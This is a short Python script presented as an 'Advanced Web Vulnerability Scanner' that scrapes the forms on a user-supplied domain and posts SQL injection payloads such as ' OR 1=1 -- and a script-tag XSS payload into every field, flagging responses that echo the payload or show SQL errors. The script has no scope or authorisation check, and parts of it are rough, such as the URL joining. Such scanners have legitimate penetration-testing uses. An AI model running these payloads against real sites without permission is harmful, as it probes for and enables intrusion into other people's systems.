import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import argparse
import os

# Argument Parsing
parser = argparse.ArgumentParser(description="Advanced Web Vulnerability Scanner")
parser.add_argument("-d", "--domain", required=True, help="Target domain")
args = parser.parse_args()

domain = args.domain
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0"

# Ensure Recon Directory Exists
os.makedirs(f"recon/{domain}", exist_ok=True)

def get_forms(url):
    response = session.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup.find_all('form')

def sqli_scan(form, url):
    sqli_payloads = ["'", '"', "' OR 1=1 --", '" OR 1=1 --']
    for payload in sqli_payloads:
        print(f"Testing {url} for SQL Injection with payload: {payload}")
        data = {input_tag['name']: payload for input_tag in form.find_all("input")}
        response = session.post(url, data=data)
        if "SQL syntax" in response.text:
            print(f"[+] SQL Injection vulnerability found at {url} with payload: {payload}")

def xss_scan(form, url):
    xss_payload = "<script>alert(1)</script>"
    data = {input_tag['name']: xss_payload for input_tag in form.find_all("input")}
    response = session.post(url, data=data)
    if xss_payload in response.text:
        print(f"[+] XSS vulnerability found at {url}")

def main():
    print(f"[+] Scanning {domain} for vulnerabilities...")
    response = session.get(f"http://{domain}")
    forms = get_forms(response.url)

    for form in forms:
        action = form.attrs.get("action").lower()
        form_url = urljoin(domain, action)
        sqli_scan(form, form_url)
        xss_scan(form, form_url)

if __name__ == "__main__":
    main()
